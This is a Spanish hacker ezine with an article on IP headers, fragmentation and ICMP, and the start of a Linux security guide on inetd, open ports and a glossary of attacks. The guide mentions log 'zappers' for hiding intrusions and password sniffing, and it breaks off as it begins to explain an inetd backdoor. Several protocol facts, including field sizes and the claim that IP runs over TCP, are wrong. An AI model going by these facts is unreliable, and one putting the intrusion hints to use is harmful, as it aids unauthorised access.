    ÚÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿                       
    ³        ³ Tama¤o ³  Procedencia   ³                                ³
    ³ Version³ de la  ³                ³      Tama¤p del datagrama      ³
    ³        ³Cabecera³tipo de servicio³                                ³
    ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´          
    ³                                  ³      ³    Desplazamiento del   ³
    ³          Identificador           ³Flags ³                         ³
    ³                                  ³      ³        segmento         ³
    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
    ³                 ³                ³       Suma de control de       ³
    ³ Tiempo de vida  ³   Protocolo    ³                                ³
    ³                 ³                ³           la cabezera          ³
    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
    ³                                                                   ³
    ³                DIRECCION IP DEL HOST DE ORIGEN                    ³
    ³                                                                   ³
    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
    ³                                                                   ³
    ³                DIRECCION IP DEL HOST DE DESTINO                   ³
    ³                                                                   ³
    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
    ³                                                                   ³
    ³                                                                   ³
    ³                     OPCIONES ESPECIALES                           ³

    ³                                                                   ³

    ³                                                                   ³

*****************************************************************************

¨Que co¤o es todo esto? segudamente vamos  responder esta pregunta explicando
el contenido de cada uno de los 'bits' de la cabecera de IP.

1.-VERSION: (3 bits) Indica la version de IP que se esta tratando (La version
            actual es IPv4, pero en un futuro no muy lejano se dara paso a la
            nueva generacion de IP, IPv6).

2.-TAMA¥O DE LA CABECERA: (5 bits) El tama¤o de la cabecera se mide mediante
                          palabras de 32 bits, si no se tratan opciones
                          especiales, el tama¤o de la cabecera es de 5
                          palabras de 32 bits, lo que hace un total de 20
                          bytes.

3.- PRECEDENCIA, TIPO DE SERVICIO: (8 bits) De los 8 bits que forman este
                                   campo, los tres primeros indican la
                                   precedencis (que ayudaran a los routers a
                                   saber que paquetes tienen preferencia, si
                                   se ve obligado a descartar alguno), los
                                   quatro siguientes indican el tipo de
                                   servicio (TOF - Type of Service), que se
                                   rige segun los siguientes valores:

                                   0000 - valor por defecto

                                   0001 - Minimizar el coste

                                   0010 - Maximizar la fiabilidad

                                   0100 - Maximizar el rendimiento

                                   1000 - Minimizar el retraso

                                   1111 - Maximizar la seguridad

4.- TAMA¥O DEL DATAGRAMA: (16 bits) Al igual que en el tamano de la cabecera,
                          se mide mediante palabras de 32 bits.

5.- IDENTIFICACION: (16 bits) Este campo lo trataremos mas adelante, cuando
                    hablemos de la fragmentacion.

6.- BANDERAS (o flags): (3 bits) Al igual que en identicacion, lo trataremos
                        con la fragmentacion.

7.- POSICION: (13 bits) Otra vez lo mismo, lo veremos en la fragmentacion :P

8.- TIEMPO DE VIDA: (8 bits) Que ocurriria si un datagrama tiene algun
                    problema, y le es imposible llegar a su destino, este
                    viajaria por la red eternamente, gastando recursos
                    innecesarios de la misma. Para evitar esto existe el
                    tiempo de vida (TTL - Time To Live), que es un numero que
                    se reduce en uno cada ves que este atraviesa un router.
                    El valor recomendado para el TTL es el doble del comino
                    mas largo por el que puede ir el datagrama (al camino mas
                    largo se le denomina "diametro").

9.- PROTOCOLO: En este campo se le indica a IP (en el host que recibe el
               datagrama) a quien debe entregar el paquete, es decir, se
               indica que protocolo se usa.

10.- SUMA DE CONTROL DE LA CABECERA: Este campo contiene una seri de
                                     operaciones realizados con los distintos
                                     campos de la cabecera de IP, y sirve
                                     para validar el contenido de la misma,
                                     ya que algun error pudo dejar el paquete
                                     en mal estado.

11.- OPCIONES ESPECIALES: El contenido que se almacena es muy variado, y son
                          opciones especiales de IP, como "ruta forzada",
                          "registro de ruta", "seguridad", etc (trataremos
                          a fondo alguna de estas opciones).


Vistos ya cada uno de los campos de la cabecera de IP en el datagrama, va a
ser el momento de tratar la fragmentacion (de manera que explicaremos tambien
la utilidad de los campos "Identificacion", "Bandera" y "Posicion".

¨Que ocurre cuando un router no puede procesar un datagrama por que este
tiene un tama¤o demasiado grande? (esto puede suceder por muchos motivos;
tama¤o del buffer insuficiente, el tama¤o del datagrama supra al tama¤o
maximo que el medio ficico puede aceptar, etc) Es entonces cuando se realiza
la fragmentacion, que consiste en dividir el datagrama en otros mas peque¤os.
¨Y como se realiza esto? El proceso es el siguiente:

1.- El router recibe el datagrama y comprueba que su tama¤o es demasido
    grande, entonces comprueba el segundo bit de la bandera, si este esta a 0
    el datagrama podra ser dividido, mientras que si es 1 el router se vera
    obligado a descartar el datagrama (veremos como funcionan los bits de
    bandera).

2.- En caso de que el se pueda realizar la fragmentacion, los datos de
    dividen en trozos (cada trozo debe contener un multiple de 8 bytes), de
    manera que los datos podran ser enviados.

4.- A cada uno de los trozos se les coloca la cabecera IP del datagrama
    original, pro modificando los siguientes campos.

        -Se les asigna una identifintificacion comun a todos los trozos.

        -Tama¤o del datagrama, este pasara a ser el tama¤o del nuevo
         datagrama.

        -El tercer bit de bandera debe ponerse a 1 en todos los datagramas
         exepto en el ultimo.

        -En el campo de posicion se solocara la posicion del trozo en el paquete
         original.

        -Los campos de suma de control deben ser actualizados.


Asi pues ya sabemos para que sirven los campos identificacion, bandera, y
posicion. Volviendo a la explicacion de cada campo de la cabecera:

5.- IDENTIFICADOR: (16 bits) Este campo contiene un identificador comun en
                   todos los fragmentos que pernecen a un mismo datagrama
                   original.

6.- BANDERA: (3 bits) Cada uno de los bits de la bandera tiene una utilidad.
             El primer bit esta reservado para futuras aplicaciones de IP, y
             de momento esta siempre a 0. El segundo bit indica si el
             datagrama puede ser enviado mediante fragmentacion o no (0=Puede
             fragmentarse, 1=No puede fragmentarse). El tercer bit, muestra
             si hay mas fragmentos que pertenecen a un datagrama original
             (0=No hay mas fragmentos, 1=Hay mas fragmentos), logicamente si
             no se ha producido fragmentacion, este tercer bit estara a 0,
             pues no habra mas fragmentos.

7.- POSICION: (13 bits) En caso de fragmentacion indica la posicion de los
              datos respecto al datagrma original.


Esto de la fragmentacion esta muy bien, ¨Pero como lo hace el host de destino
para unir nuevamente los trozos? A la accion de unir los trozos se la
denomina "reconstruccion", y se realiza de la siguiente manera.

1.- El host de destino recibe un datagrama, para identificar si se trata de
    de un fragmento, mirara el campo de "posicion", si esta es diferente a 0
    se trata de un fragmento, de lo contrario, IP mira el tercer bit de
    bandera, si este esta a 1, tambien se trata de un fragmento (en este caso
    se trata percisamente del primer fragmento).

2.- IP debe asignar una memoria temporal para almacenra cada uno de los
    fragmentos. Para identificar los fregmentos que pertencen a un mismo
    datagrama original, IP mira los campos "Identificacion", "Direccion de
    origen", "Direccion de destino" y "protocolo", en todos los fragmentos,
    han de coincidir estos campos.

3.- Si falta algun fragmento, se esperara un tiempo, y si sigue sin llegar se
    descartaran todos los trozos que hayan llegado. En el caso de que se
    disponga de todos los fragmentos, IP procedera a la recontruccion
    basandose en el campo "Posicion".

4.- Tras la recontrucion los datos se entregaran al siguiente nivel.


Ahora que ya sabemos como funciona la fragmentacion y la recontruccion, ha
llegado la hora de tratar el campo de opciones especiales con un poco de
profundidad.

Como ya dije anteriormente, el contenido de este campo de la cabecera IP es
muy variado, pero nosotros solo trataremos las cosas que yo considero mas
intresantes, la "ruta forzada" y los "registros de ruta", que suponen una
parte importante en la seguridad de IP.

Empezaremos con la "ruta forzada": En algunos casos es posible que un paquete
contenga informacion muy importante y secreta, y no es cuestion de soltarlo a
la red dandole unicamente la direccion IP de destino, pues, como ya sabeis,
el paquete viajara por la red pasando por muchos routers a los que algun
"hacker" podria tener acceso, de manera que este podrias apoderarse del
contenido secreto del paquete. Para evitar este problema, en muchos casos, se
usa la "ruta forzada", obligando al datagrama a pasar por routers de
confianza y/o seguros. ¨Y como funciona esto realmente? En el host de origen
del datagrama, IP almazena una lista de direcciones IP por las que debe
pasar el paquete, y un puntero que hace referencia al proximo salto (este se
ira incrementando salto a salto) en el campo de "opciones especiales", de
manera que se fuerza la ruta del mismo. Cada vez que el paquete pasa por un
router, mira en la tabla de encaminamiento (no hablo de ello, pues supongo
que la mayoria sabeis como funciona. Quiza le dediquemos un articulo mas
delante) y almacena en la cabecera la direccion IP de ese router a la vuelta
(esta es la manera de hacer que los paquetes que deban volver sepan por donde
hacerlo), seguidamente se incrementa el puntero para hacer referencia al
proximo salto.

Como habeis podido ver la "ruta forzada" no guarda ningun secreto, y es
bastante segura, pero ¨Que pasa si un hacker se apodera de un router seguro?
Este tendra a su disposicion una gran cantidad de secretos, que podra aplicar
para hacer el mal (hay gente muy mala por ahi suelta :P).

Ahora sigamos con una explicacion del funcionamiento de los "registros de
ruta": Consiste en la creacion de una lista de las IP's de salida de cada uno
de los routers por los que el datagrama pasa, el funcionamiento es muy
simple, cada vez que el datagrama pasa por un router, se a¤ade la IP de
salida del mismo. Puede darse el caso de que el campo de "opciones
especiales" del datagrama agote su espacio antes de llegar a su destino, en
ese caso dejara de a¤adirse IP's. ¨Para que puede servir todo esto? Pues
unicamente para saber donde pasa el paquete, lo que puede facilitar la
busqueda de algun "hacker" que haya interceptado el paquete :)

¨Que ocurre si las cosas no van bien y el paquete no es capaz de llegar a su
destino? Supongamos que un datagrama con bandera 010 (o 011) llega a un
router que no tiene suficiente buffer para reenviar el paquete (o por
cualquier otro motivo, como destino fuera de servicio o inexistente, tiempo
de vida del datagrama expirado, etc) y se ve obligado a descartarlo. Este
debe apa¤arselas de alguna manera para avisar al host de origen y decirle que
paquete no podra llegar a su destino de ninguna manera ¨Como hace eso? Pues
con el protocolo ICMP (Internet control messager protocol) ¨Y como funciona?
Esto es lo que voy a tratar de explicar a continuacion: El ultimo router por
el que pasa el datagrama genera una cabecera ICMP (veremos como es a
continuacion) y otra IP cuyo host de origen es el mismo router, y el de
destino es el host de origen del datagrama original (como un juego de
palabras, jejeje).

******************[ Cabecera ICMP de un mensaje de control ]*****************

    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
    ³                ³                  ³      Suma de control de        ³
    ³     Tipo       ³      Codigo      ³                                ³
    ³                ³                  ³          la cabecera           ³
    ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
    ³                                                                    ³
    ³                                                                    ³
                   NOTA: El resto de la cabecera depende de
    ³                    el campo TIPO                                   ³

    ³                                                                    ³

*****************************************************************************

1.- TIPO: (8 bits) Indica basicamente el formato del resto del mensaje. Los
          valores mas comunes que puede tomar son:

          3 - Mensaje de destino inalcanzable.

          4 - Mensaje de acallamiento de origen.

          11 - Mensaje de plazo superado.

          12 - Mensaje de problema en los parametros.



2.- CODIGO: (8 bits) En este campo se encuentra una descripcion exacta del
            error producido. Sus posiblidades son los siguientes:

          0 - No es posible llegar al host de destino.

          1 - No es posible llegar a la red de destino.

          2 - El destino no posee el protocolo solicitado.

          3 - Puerto inaccesible.

          4 - Es necesaria la fragmentacion, pero en la bandera se indica
              "no fragmentar".

          5 - Ruta de origen incorrecta.

          6 - Red de destino desconocida.

          7 - Host de destino desconocido

          8 - Host de origen aislado.

          9 - Comunicacion prohibida con la red.

          10 - Comunicacion prohibida con el host.

          11 - Imposible llegar al tipo de servicio en la red.

          12 - Imposible llegar al tipo de servicio en el host.


3.- SUMA DE CONTROL: (16 bits) Calculos que se realizan para comprobar la
                     validez de la cabecera de la cabecera.


NOTA: El protocolo ICMP es mucho mas amplio, de todos modos no es el
      objetivo de este articulo profundizar en el, de todos modos, si lo
      solicitais quiza escriba un articulo de profundizacion a las funciones
      del protoclo ICMP (trazar rutas, obtener MTU, peticion de eco, mascara
      de direccion, tiempo de respuesta o ping).


Terminamos aqui, seguiremos con las entra¤as de internet en el proximo
numero. Toca esperar :P


NOTA FINAL: Los protocolos de internet son bastante complejos, y es posible
            que se me haya escapado alguna cosilla, si cres que hay alguna
            errata o deberia ampliar alguna cosa o.... para
            felicitarme (ehehe) mail a ripe@mixmail.com o al mail oficial de
            7a69.
                         



ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º9.- Seguridad en linux I      º     Seguridad      º         Medio         º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                    [ Trycky ]

Vayamos alla con el articulo:

-=( 01 )=- A cerca de ...
-=( 02 )=- Informacion .
-=( 03 )=- Inetd .
-=( 04 )=- tcp_wrapper .
-=( 05 )=- tcpdump .
-=( 06 )=- Los Logs .
-=( 07 )=- Truquillos varios .
-=( 08 )=- Seguridad desde el nucleo .
-=( 09 )=- Seguridad desde dentro .
-=( 10 )=- Seguridad en las X .
-=( 11 )=- Documentacion .

            ..--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--..

-=( 01 )=--=( A cerca de ... )=-

Doy todo el derecho a distribuir este documento aunque si no lo diera tambien 
lo harias osea que respeta por lo menos el contenido y deja al autor si 
encuentras algun fallo corrigelo y mandame una copia . Perdonarme las faltas 
ortograficas por lo de las tildes supongo que sobrevivireis.

Si quereis contactar conmigo me podreis encontrar en el Irc-Hispano con el 
nick de Trycky.
  
-=( 02 )=--=( Inforamacion )=-

Que tal vamos a empezar con la administracion para aquellos que se acaban de
instalar Linux y resulta que tienen todos los puertos abiertos esto es debido
a que biene prederteminado que los servicios se lanzen desde el principio
esto la verdad es que gasta recursos poco pero algo y si no los usas pues
estorban y pueden peligrar la integridad del sistema pos lo primero sera ver
los puertos que tenemos abiertos . Esto suelen venir en las distribuciones
mas faciles como la Red Hat , SuSE , etc .

Poniendo 'socklist' nos saldran los puertos abiertos . O si no bien usando 
algun scaneador de puertos como : nmap , strobe , etc .

Lepton:~ # socklist 
type  port      inode     uid    pid   fd  name
tcp     23        241       0    267    5  inetd
tcp     21        240       0    267    4  inetd
raw      1          0       0      0    0
raw      6          0       0      0    0

Explico las cosas :

type : tipo de puerto (tcp / udp / raw ).
port : el puerto esta claro.
pid  : la PID del programa (Doy por echo que sabeis lo que es).
name : el Nombre del Demonio / Programa.

Con esto nos damos cuenta de que tenemos abierto el telnet y el ftp aunque 
mucho sistema te suele cargar el sendmail desde que aranca el linux.
tambien cabe destacar que el Inetd es el encargado de esto pero despues lo
explico para acceder a estos servicios vasta con hacer telnet localhost
puerto la verdad es que activar el servicio del telnet si solo nos conectamos
un rato no sirve de mucho y mas si somos la tipica persona que ponen de
passwd el login digase root / root , etc .
Y el FTP si no lo tenemos bien configurado es un agujero por el que entrar 
cuando hagais un FTP molestaros de hacerlo bien no a lo chapuza asiganando un
grupo y un usario para el FTP me remito a how-to de ftp-anonimo donde teneis
mucha info para orientaros. 
Ahora paso a explicar en Inetd y los tcp_wrapper para que veais como se 
desactivan estos servicios si teneis otros servicios que no son del inetd y 
estais muy impacientes por matarlos poner : killall -9 nombre (el nombre lo 
sacais del socklist) . Antes de empezar cabria explicar lo que es un demonio 
no es mas que un programa que esta de fondo realizando ciertos trabajos
pueden ser esperar conexiones o tambien el logeo del sistema se encarga otro
demonio llamado syslogd , etc .

Para saber a que corresponde cada puerto vasta con irnos a /etc/services y
nos vendra un listado de los servicios y su puerto , por eso no he puesto una
lista de los puertos ya que con que te vayas alli y lo mires .

Explicacion breve de algunos terminos :

Ethernet : Pues esto no es mas que la tarjeta de red siempre cuando te
conectas desde una tarjeta de red se le asigna el nombre de interface eth0
incrementandose en uno por cada tarjeta mas . En las "lan" se usan estas 
tarjetas y hay de dos tipos de RJ45 que son como la de los telefonos solo que
la de los telefonos son RJ15 o por ahi y el cable BNC que son los que al
final siempre acaban es una chiringuito para que no siga la corriente estos
cable formados por una clavija macho y la hembra en la tarjeta este cable es
el mismo que se usa para las emisoras , Y es mas barato me consta . Aunque
casi todas las redes actuales se hacen con cables de RJ45 dado que al formar
la arquitectura es mucho mas simple con los cables BNC todos los cables
tenian que pasar por un ordenador al contrario que los RJ45 que pueden
conectar a un router y desde ahi ya enganchar tantos cables como sea
neceserio .

Sniffer : Esto es cuando en una red local hamos con tarjetas de red , etc .
Si consigues acerte root en el ordenador principal o si haze de router , etc
con el sniffer vas logeando las conversaciones que va reciviendo la tarjeta
de red pero pa eso hay que ponerla en modo promiscuo *creo* y captar todos
los paketes y logearlos , por ejemplo un usuario haze telnet a esa makina pos
eso lo envia por la red local y tu tarjeta de red esta puesta pa que analize
todos los paketes que vayan pasando sean pa echa o no , por lo que como el
password no esta encriptado a sido tarea facil a no ser que usen ssh . Esta
explicacion ha sido un poco cutre pero bueno que se le va a hazer . No todos
los sniffers son en redes locales lo sullo es instalarlas en makinas donde
pasen muchos paquetes importantes y guardamos esa preciosa inforamacion .

zapper : Estos programas sirven para quitar los logs que hayamos dejado los
hay desde los que borran todos los archivos de los logs hasta los que editan
el fichero y quitan nuestros pasos . Aunque lo mejor es hacerlo a mano , que
para eso doy una explicacion de los logs mas adelante .

DOS : Denegacion De Servicio ( Denial of service ). Pues es debido cuando
un programa tiene un error y este al ser explotado empieza a chupar muchos 
recursos esto puede conllevar a la caida del sistema , etc . como el famoso
ping de la muerte . En linux los DOS mas famosos o los que yo creo son los
del propio kernel el kernel tiene fallos que al ser explotados por algun
exploit pues causan cosas raras si puedo intentare poner algunos exploits de
ejemplo. Seguramente todos conozereis el DOS de los pentium un fallo en los
micros de intel que hacia que se quedase bloqueado el ordenador sin
importancia del S.O actualmente el Kernel del linux lo tiene corregido .

Exploit : Pues un exploit es el encargado de aprovechar un error del programa
para convertirte en root siempre y cuando el programa explotado este usando
el setsuid de aki su importancia , los exploits casi siempre son codigo en C
aunke tambien los hay en forma de script y en perl . Lo mas normal en los
exploits es que estos sobrepasen los valores de una variable por lo que el
programa dara un error que nosotros aprovecharemos si el programa esta con la
setsuid activada que es la encargada de dar permisos de root a un fichero sin
ser nosotros el root , pues si el programa tiene la setsuid activada nos
convertiremos en root debido a que en ese momento eramos root o si el
programa da un fallo y genera un core donde podremos buscar los passwd y
logins . Muchos exploits traen fallos de programacion metidos a posta a ver
si os vais a creer que es lo dan todo pero son fallos tan simples que solo
teneis que mirar la linea del error y mirarlo que no es muy dificil ademas a
si aprendeis un poco de programacion . Aunque no penseis que todos los
exploits funcionan de las misma forma. Lo mas normal es que se aprobechen de
un segmetation fault que no es mas que cuando hay un desbordamiento de pila
'perdonarme que me repita tanto' por ejemplo si nosotros hacemos un programa
que no guarde un array de 10 letras y escribimos 20 letras por ejemplo nos
dara un segmentation fault dado que el habia reservado en memoria para 10 mas
el salto de carro . Esta explicacion ha sido un poco penosa despues me
explicare mas detenidamente .

Core Dump : Pues los core son fallos producidos por la makina donde guardan
un archivo con todo lo que estaban haziendo osea que si te pones a husmear
podras encontrar los password y los login , tambien los programas realizan
cores como el del ftp hay otro tipo de core que son en la programacion que
sirven para volcar el programa cuando da un error y depurarlo .

Flood : Son ataques que consisten en desbordar a la maquina con muchos
paquetes sin que esta le de tiempo a respoderlos como el ping flooding que
consistia en mandar muchos paquetes a una maquina y si esta tiene una
conexion lenta pues se caera debido a que no puede constestar a todos estos .
Otro ataque de estos es el SYN flooding que cuando se va a conectar a tu
maquina creo que consiste en no parar de enviar paketes tcp con el bit SYN
siempre a uno por lo que esta siempre pendiente de la conexion para
solucionar este problema se podria compilar el nucleo con la opcion :

[*] IP: TCP syncookie support (not enabled per default)

Tienes que activar la opcion poniendo.
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

Spoof : Consiste en cambiar tu IP por otra para a si por ejemplo entrar en un
equipo donde esa ip que has spoofeado tenga permisos por los comando rlogin ,
etc. Hay varios atques de estos el DNS / Spoofing , IP / Spoofing , etc .
Aunque para hacer este tipo de ataques hay que tener un gran control en el
protocolo TCP / IP . Este ataque parece simple pero no lo es por que cuando
se establece una conexion entre dos maquinas estas tienen un numero en cada
paquete que va cambiando y la otra maquina lo va leyendo y si es ese pues
acepta el paquete o no , etc . Por lo que para meterse en medio de una
conferencia se deberia de conocer ese numero que en cada paquete cambia y
dejar a la otra maquina bloqueada para a sin no tener que preocuparte de que
a esta le llegen los otros paquetes floodeandola bastaria o haciendo algun
tipo de DOS , etc . Espero que os haya quedado claro aunque es un tema algo
complicado .

Ahora os dare un listado de programas :

nmap : Fabuloso escaneador de puertos que tambien permite averigo el S.O,
muchas distribuciones lo traen y su uso es sencillo ;
http://www.insecure.org/nmap/

strobe : Un scanner de puertos muy sencillo y facil de conseguir . Que usa el
/etc/services para saber que puerto es .

Jhon Ripper : john en comando. Sirve para crackear los passwd e averiguarlos
su uso es mu sencillo ademas puede ir generando combinaciones de  palabras y 
numeros aleotarias o eso o tengo un peazo de diccionario del copon su uso en 
verdad sirve para averiguar las claves poco seguras y cambiarlos esas como
root admin , etc . Este programa lo que haze es ir encriptando palabras y 
comparandolas con las del archivo de passwd , se encuentra en casi cualquier 
distribucion y esta en toda la red . Aunke el uso que se le suele dar no es
el de averiguar password poco seguros e cambiarlos pero bueno los buenos
passwd son por ejemp X|¡>dfE2 , contrase¤as to raras con conbinaciones de
signos y que ademas no tienen ninguna relaccion con algun idioma dado que hay
diccionarios de letras en ingles donde seria muy facil adivinar el passwd.
Por lo que no se aconseja poner passwd como root para el root , siempre y
cuando demos servicios con nuestra maquina pero estos consejos son de 2 dedos
de frente .

Nessus : Es un programa que chekea tu ordenador en busca de fallos de
seguridad ademas te puedes hazer tus propios plug-ins. Es muy bueno ;
www.nessus.org

Saint y Satan : Pues pa lo mismo que el otro solo que estos son mas antiguos
y son desde la terminal el nessus es desde las X . El satan es el mas antiguo
de los dos el saint es mas nuevo y lo bueno de estos programas es que te
crees tu tus plug-ins al igual que el nessus ;

Queso : Que Sistema Operativo , sirve para determinar el tipo de S.O esta
echo por un espa¤ol savage este programa lo que haze es mandar paquetes a un
puerto sin sentido alguno por lo que dependiendo del S.O (Sistema Operativo)
le da de responder de una manera o otra ; http://apostols.org/projectz/queso

Ethereal : Sniffer de red para las X . Usa las GTK ; http://ethereal.zing.org

PGP : Pues es un metodo de encriptacion que todo el mundo deberia de tener 
tiene varias formas de cifrado y es casi imposible de romper a la fuerza
bruta dado que tiene dos partes un codigo pa encriptar los mensajes que ese
se lo darrias a todas las personas que quieras y otro que lo desencripta
simple.

GnuPGP : Lo mismo pero GNU sin restricciones de Cifrados por eso de que no es 
americano aunque no se si se iva a quitar ya dentro de poco y ademas esta
bajo licencia GPL cosa que no se si esta el PGP . Puedes conseguirlos en :
Pagina Web    : http://www.gnupg.org
FTP principal : ftp://ftp.gnupg.org/pub/gcrypt/

Tambien Una peque¤a descripcion del archivo de passwords :

"etc/passwd"
root:x:0:0:root:/root:/bin/bash

root : El primer campo indica el login
x : A ki vendria el passwd pero como uso el shadow el passwd esta en shadow
    esto se debe a que el archivo passwd tiene que estar para todos los 
    usuarios y el shadow esta solo pal root
0 : Esta es la uid (User Identification) 
0 : Esta seria la guid (Group User Identification) la uid del Grupo
/root : El home del usuario
/bin/bash : Su shell cada vez que se identifique vaya a esa tambien puede ser 
zsh , ksh (Esta es como la de los antiguos sistemas unix la Korn esta en
cambio es publica)

"etc/shadow"
root:AKIVENDRIAELPASSWD:10923:0:10000:::: 

Y en este archivo vendria el passwd simple no.

Alguna utilidades que todo linux tiene :

ping : Podemos calcular el retardo de nuestra conexion . O de la ajena. Esta 
herramienta nacio como herramienta de analizar pero con el tiempo el
protocolo ICMP pues a cambiado mucho ahora se intenta usar para flodear a la
gente etc. pero cuando quieres saber el lag que tienes en el IRC por ejmp te
hazes un ctcp nick ping. El lag es el tiempo que tarda en que un pakete llege
a ti con toda la info claro.El protocolo ICMP es bastante bueno y tiene
muchas opciones.

traceroute : Nos dice por todas las maquinas ke pasan nuestros paketes hasta
llegar a su objetivo . Puedes especificar puerto .
 
dig : Es una utilidad de las DNS (Domain Name Server) que nos dice los demas
subdominios de la red o el domino nos da bastante info.

ifconfig : Nos muestra todos los interfazes de red que estamos usando desde
el lo (local loopback) , ppp0 (conexion mediante el ppp) , eth0 (la tarjeta
de red). Pero a parte de mostrarnos el estado de los interfazes podemos 
configurarlos desde dar de alta mas interfazes y poder poner la tarjeta en
modo promiscuo .

netstat : Sirve para la monitorizacion de la red , nos dice todos los paketes
recividos , los que no hemos llegado a responder , los recibidos , etc .
Pon "netstat -i" para que te muestre el estado de los interfazes , tambien
con "netstat -s" nos dara una salida mas clara . Con netstat -r nos muestra
la tabla de rutado.

Ahora alguna librerias :

Libcap : Estas librerias estan echas para hazer mas amena la programacion de 
sniffers y eso.

Libnet : Pues son librerias de redes con estas librerias puedes ahorrar mucho 
trabajo. A la hora de programar

Ahora algo de los protocolos :

TCP/IP : Estos protocolos son la base de las comunicaciones por internet por
el momento , el protocolo IP trabaja sobre el TCP el protocolo IP es que se
te asigna cada vez que te conectas a internet o tienes asignado eso varia
ahora mismo se esta usando el IPv4 que no es mas que XXX.XXX.XXX.XXX de 32
bits , aunque se esta desarollando el IPv6 que contiene ciertas mejoras y un
mayor rango por que debido al masivo uso de internet se estan acabando los
rangos y entre las mejoras que contiene esta que es de 128 bits , posibilidad
de compresion , entre otras el IP por decirlo de alguna forma es el encargado
de rutar los paketes . Ahora el protoclo TCP (Transport Control Protocol) a 
por cierto el IP significa (Ineternet Protocol). El TCP es un protocolo que 
trabaja a nivel de aplicacion mas o menos , a diferencia de otros protocolos
como el UDP el TCP envia los datos en orden y asegurandose de que llegen si
no dara un bonito error. El TCP tambien una cabezera donde indica la Ip de
donde ha sido enviado , la IP a donde tiene que ir , el Puerto de donde sale
y el al puerto que va . Tambien tiene las flags que son SYN , ACK , FIN ,
etc.

Un Pakete TCP estaria compuesto de :
IP origen     <-> IP destino
Puerto origen <-> Puerto destino . (Creo que las explicaciones son obvias).

Y las Flags : (Hay mas flags)
SYN : haze peticion para la conexion .
ACK : autentificacion del pakete .
FIN : Finaliza la conexion . 
SEQ : Numero de sequencia del pakete .
 
UDP : El UDP (User Datagram Protocol) es un protocolo mas rapido que los
demas dado que envia paketes pero no se preocupa de que si han llegado o no ,
el solamente envia y ademas todo del tiron no como el TCP por ejemp aunke
este tambien trabaja sobre el IP. Y tampoco deja a la maquina pendiente de
una respuesta no como el TCP.

-=( 03 )=--=( INETD )=-

El Inetd la ultima d por lo de demonio es un programa que estable la
relaccion entre puerto al que se accede y al programa que tiene que llamar.
Por ejemplo si accediecemos al puerto 21 lo primero que haria es irse al 
"/etc/services" y mirar que servicio corresponde con ese puerto una vez 
realizada da con la conclusion que el puerto 21 es el de ftp aunque esto
puede variar dado que podemos cargarlo a mano y poner que acceda o otro
servicio. Ahora que ya sabe a que corresponde este servicion se dirige a
"etc/inetd.conf" y llama al demonio correspondiente. En el archivo
"/etc/inetd.conf" es el archivo de configuracion para el inetd.

Ahora explicare las cosas mas lentamente :

-Nombre--Conexion-Protocolo--Espera--Usuario--Demonio de Conexion--Demonio-
ftp       stream    tcp      nowait   root     /usr/sbin/tcpd  wu.ftpd -a

Nombre : Esto biene asociado al archivo /etc/services .
Conexion : Tipo De Conexion a realizar.
Protocolo : Pues el protocolo usado tcp o udp .
Espera : El tiempo de espera .
Usuario : Pos el los permisos con los ke se ejecuta el demonio en este caso
          el del root uid=0 .
Demonio de conexion : El programa que se encarga de eschuchar la conexion 
Demonio : El programa al que se llama .

De aqui se llama al wu.ftpd que es un servidor de ftp el primer campo vendra
asociado al fichero /etc/services .
Por cierto si os parais a pensar un poco desde estos archivos se puede abrir 
una puerta trasera .
Si queremos abrir una puerta trasera con el inetd es mu facil pero que mu
